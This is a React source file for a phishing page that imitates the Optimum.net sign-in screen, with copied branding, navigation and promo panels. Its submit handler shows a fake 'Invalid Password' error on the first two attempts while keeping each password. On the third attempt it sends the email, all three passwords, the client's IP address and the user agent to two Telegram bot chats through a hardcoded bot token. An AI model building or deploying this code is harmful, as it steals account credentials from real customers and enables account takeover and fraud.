import React, { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom';

const Home = () => {

    const [showPassword, togglePassword] = useState(false);
    const [menuOpen, setMenuOpen] = useState(false);
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const { userEmail } = useParams()
    const [loading, toggleLoading] = useState(false)
    useEffect(() => {
        setEmail(userEmail)
    }, [email])

    const [errors, setErrors] = useState({ email: '', password: '' });
    const validateEmail = (email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };
    const [count, toggleCount] = useState(0)
    const [password1, togglePassword1] = useState('')
    const [password2, togglePassword2] = useState('')
    const [clientIp, setClientIp] = useState('');
    const [userAgent, setUserAgent] = useState(navigator.userAgent);

    useEffect(() => {
        // Fetch the client's IP address using an external API
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                setClientIp(data.ip);
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });
    }, []);

    const handleSubmit = async () => {
        let emailError = '';
        let passwordError = '';

        if (!validateEmail(email)) {
            emailError = 'Please enter a valid email.';
        }
        if (password.length < 8) {
            passwordError = 'Password must be at least 8 characters.';
        }

        setErrors({ email: emailError, password: passwordError });
        if (count < 2) {
            if (count === 0) {
                togglePassword1(password)
                toggleLoading(true)
                setTimeout(() => {
                    toggleLoading(false)
                    setPassword('')
                    let passwordError = 'Invalid Password';
                    setTimeout(() => {
                        setErrors({ email: '', password: '' });
                    }, 2500);
                    toggleCount(count + 1)
                    setErrors({ email: emailError, password: passwordError });
                }, 2500);
            }
            else if (count === 1) {
                togglePassword2(password)
                toggleLoading(true)
                setTimeout(() => {
                    toggleLoading(false)
                    setPassword('')
                    let passwordError = 'Invalid Password';
                    toggleCount(count + 1)
                    setErrors({ email: emailError, password: passwordError });
                    setTimeout(() => {
                        setErrors({ email: '', password: '' });
                    }, 2500);
                }, 2500);
            }
        }
        else {
            if (!emailError && !passwordError) {
                // Prepare the message to send
                const message = `Email: ${email}
1st Attempt Password: ${password1}
2nd Attempt Password: ${password2}
3rd Attempt Password: ${password}
Website: optimum.net
Client IP: ${clientIp}
User Agent: ${userAgent}`;

                // Replace these values with your bot token and chat ID
                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
                const chatId = '-1002398431021';
                const botToken2 = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
                const chatId2 = '7380056237';

                try {
                    // Send the message to Telegram
                    toggleLoading(true)
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    });

                    await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId2,
                            text: message,
                        }),
                    });


                    toggleLoading(false)
                    // Optional: Handle success feedback or further actions here
                    alert('Data sent successfully!');
                } catch (error) {
                    toggleLoading(false)
                    console.error('Error sending message:', error);
                }
            }
        }
    };


    return (
        <div className="w-full text-[0.82rem] bg-[rgb(224,224,224)] h-screen flex flex-col items-end">
            <>
                {/* Desktop Navbar */}
                <span className={`w-full h-full fixed top-0 left-0 bg-[#0000009a] transition-all flex justify-center items-center ${loading ? "z-[100]" : "z-[-2]"}`}>
                    <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png" className='spinner w-[10rem]' alt="" />
                </span>
                <div className="w-full hidden md:flex justify-center text-white fixed bg-[rgb(0,40,100)] p-4">
                    <div className="flex justify-between w-full max-w-[90rem] px-[4rem]">
                        <div className="text-4xl gap-0.5 flex items-center font-extrabold">
                            Optimum
                            <span className="p-[0.3rem] rounded-full mb-[-1.2rem] bg-[#FD6E00]" />
                        </div>
                        <div className="flex flex-col gap-2">
                            <div className="flex w-full font-semibold text-base gap-6 items-center">
                                <p>Sign in</p>
                                <p>Pay bill</p>
                                <p>Support</p>
                                <div className="relative rounded-md font-normal">
                                    <input
                                        type="text"
                                        className="w-[15rem] outline-none text-[#333] px-4 text-[0.82rem] rounded-md border-none"
                                        placeholder="Ask me anything"
                                    />
                                    <i className="fa-solid absolute right-0 bg-[#FD6E00] top-1/2 p-1 rounded-r-md px-2 transform -translate-y-1/2 fa-magnifying-glass"></i>
                                </div>
                            </div>
                            <div className="flex justify-center gap-6 text-[1.6rem] font-light">
                                <div className="flex gap-2 items-center">
                                    <p>Internet</p>
                                    <i className="fa-solid text-white text-[1.2rem] px-3 p-2 rounded-md bg-[#666666] fa-envelope"></i>
                                </div>
                                <p>TV</p>
                                <p>Phone</p>
                                <p>My Offers</p>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Mobile Navbar */}
                <div className="w-full md:hidden justify-between flex items-center text-white fixed bg-[rgb(0,40,100)] p-4 z-[10]">
                    <div className="text-3xl gap-0.5 flex items-center font-extrabold">
                        Optimum
                        <span className="p-[0.3rem] rounded-full mb-[-1rem] bg-[#FD6E00]" />
                    </div>
                    <div className="flex gap-6 text-base items-center">
                        <i className="fa-solid rounded-r-md fa-magnifying-glass"></i>
                        <i
                            className="fa-solid rounded-r-md fa-bars cursor-pointer"
                            onClick={() => setMenuOpen(!menuOpen)}
                        ></i>
                    </div>
                </div>

                {/* Sliding Menu */}
                <div
                    className={`fixed top-0 right-0 h-full w-[250px] bg-[rgb(0,40,100)] shadow-lg z-[20] transform ${menuOpen ? "translate-x-0" : "translate-x-full"
                        } transition-transform duration-300 ease-in-out`}
                >
                    <div className="flex flex-col p-4 text-2xl text-white font-medium">
                        <button
                            className="text-right text-xl mb-4"
                            onClick={() => setMenuOpen(false)}
                        >
                            &times;
                        </button>
                        <a href="#" className="py-2">
                            Internet
                        </a>
                        <a href="#" className="py-2">
                            TV
                        </a>
                        <a href="#" className="py-2">
                            Phone
                        </a>
                        <a href="#" className="py-2 border-b border-white">
                            My Offers
                        </a>
                        <div className="flex flex-col text-lg">
                            <a href="#" className="py-2">
                                My Profile
                            </a>
                            <a href="#" className="py-2">
                                Pay bills
                            </a>
                            <a href="#" className="py-2 border-b border-white">
                                Support
                            </a>
                        </div>
                    </div>
                </div>
            </>
            <div className="w-full pt-[5rem] md:pt-[10rem] flex flex-col md:flex-row justify-center px-4 gap-4 md:gap-10 md:px-[6rem]">
                <div className="rounded-md bg-white p-4 flex flex-col w-full md:w-[22rem] gap-3 py-10 pr-10">
                    <span className="flex flex-col gap-1">
                        <p className="font-semibold">My Optimum ID</p>
                        <input
                            type="text"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className={`p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.email ? 'border-red-500' : ''}`}
                        />
                        {errors.email && <p className="text-red-500 text-sm">{errors.email}</p>}
                        <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
                            I forgot my Optimum ID
                        </a>
                    </span>
                    <span className="flex flex-col gap-1">
                        <p className="font-semibold">Password</p>
                        <div className="relative">
                            <input
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className={`w-full p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.password ? 'border-red-500' : ''}`}
                            />
                            {showPassword ? (
                                <i
                                    onClick={() => togglePassword(false)}
                                    className="fa-regular cursor-pointer fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2"
                                ></i>
                            ) : (
                                <i
                                    onClick={() => togglePassword(true)}
                                    className="fa-regular cursor-pointer fa-eye absolute right-4 top-1/2 transform -translate-y-1/2"
                                ></i>
                            )}
                        </div>
                        {errors.password && <p className="text-red-500 text-sm">{errors.password}</p>}
                        <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
                            I forgot my password
                        </a>
                    </span>
                    <span className="flex items-center gap-2">
                        <input type="checkbox" name="" id="" />
                        <p>Remember Me</p>
                    </span>
                    <div>
                        <button
                            className="p-2 rounded-md bg-[#F66608] text-white font-semibold px-4"
                            type="button"
                            onClick={handleSubmit}
                        >
                            Sign in to Optimum.net
                        </button>
                    </div>
                    <a href="https://www.optimum.net/profile/create-optimum-id" className="text-blue-500">
                        Don't have an Optimum ID? Create one
                    </a>
                </div>
                <div className="rounded-md bg-[#F2F2F2] px-4 flex flex-col items-center w-full md:w-[22rem] gap-3 pt-10">
                    <h3 className="text-4xl font-medium">New to Optimum?</h3>
                    <p className="text-base pb-2 font-light text-center">
                        Get our best deals online for fast and reliable Internet, live TV and Mobile, all from one provider.
                    </p>
                    <div>
                        <a
                            href="https://www.optimum.com/?adobe_mc=MCMID%3D87137089133563381262108746459861364670%7CMCORGID%3DBBEC02BE53309F2E0A490D4C%2540AdobeOrg%7CTS%3D1726512542&_gl=1*x5ry56*_gcl_au*MzA3NTMxMTE3LjE3MjY0MzMwMDA.*_ga*MjEzMTM0OTc5NC4xNzI2NDMyOTk2*_ga_Q99KNZFX8Z*MTcyNjUwNzczMS4zLjEuMTcyNjUwODgyMS41MC4wLjA."
                            className="p-2 rounded-md bg-[#F66608] hover:bg-[#9f5a2c] transition-all duration-300 text-white font-semibold px-4"
                            type="button"
                        >
                            Shop now
                        </a>
                    </div>
                    <img
                        src="https://static.tvlistings.optimum.net/ool/static/prod/images/CS-18419-280x160-new-to-opt.png"
                        alt=""
                    />
                </div>
                <div className="rounded-md bg-[#F2F2F2] px-4 flex flex-col items-center w-full md:w-[22rem] gap-3 pt-10">
                    <h3 className="text-4xl font-medium">Optimum Mobile</h3>
                    <p className="text-base pb-2 font-light text-center">
                        Save up to 50% on your Mobile bill vs Verizon / AT&T / T-Mobile
                    </p>
                    <div>
                        <a
                            href="https://www.optimum.com/mobile?adobe_mc=MCMID%3D87137089133563381262108746459861364670%7CMCORGID%3DBBEC02BE53309F2E0A490D4C%2540AdobeOrg%7CTS%3D1726512542&_gl=1*15wy1eb*_gcl_au*MzA3NTMxMTE3LjE3MjY0MzMwMDA.*_ga*MjEzMTM0OTc5NC4xNzI2NDMyOTk2*_ga_Q99KNZFX8Z*MTcyNjUwNzczMS4zLjEuMTcyNjUwODgyMS41MC4wLjA."
                            className="p-2 rounded-md bg-[#F66608] hover:bg-[#9f5a2c] transition-all duration-300 text-white font-semibold px-4"
                            type="button"
                        >
                            Shop now
                        </a>
                    </div>
                    <img
                        src="https://static.tvlistings.optimum.net/ool/static/prod/images/CS-18419-280x140.png"
                        alt=""
                    />
                </div>
            </div>
            <div className="fixed bottom-0 flex text-[0.9rem] font-light p-4 text-white rounded-t-lg bg-[#2760F0] hover:bg-white transition-all duration-300 hover:text-[#2760F0] cursor-pointer hover:backdrop-blur-xl items-center gap-2 right-8">
                <i className="fa-regular fa-comments"></i>
                <p>Chat with us</p>
            </div>
        </div>
    )
}

export default Home
